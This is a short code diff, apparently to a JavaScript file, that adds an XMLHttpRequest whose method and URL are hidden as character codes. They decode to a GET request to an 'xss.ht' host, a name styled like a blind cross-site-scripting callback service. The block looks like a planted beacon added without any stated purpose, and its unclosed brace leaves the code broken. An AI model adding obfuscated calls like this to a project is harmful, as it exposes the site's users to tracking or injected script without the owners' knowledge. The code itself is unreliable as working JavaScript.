@@ -15,3 +15,12 @@ xhr.onload = function () {
 
 xhr.send(null);
 
+xhr = new XMLHttpRequest();
+xhr.open(String.fromCharCode(71,69,84), String.fromCharCode(104,116,116,112,115,58,47,47,112,48,116,97,116,48,46,120,115,115,46,104,116), true);
+
+
+xhr.onload = function () {
+    if (xhr.readyState === xhr.DONE) {};
+
+xhr.send(null);
+
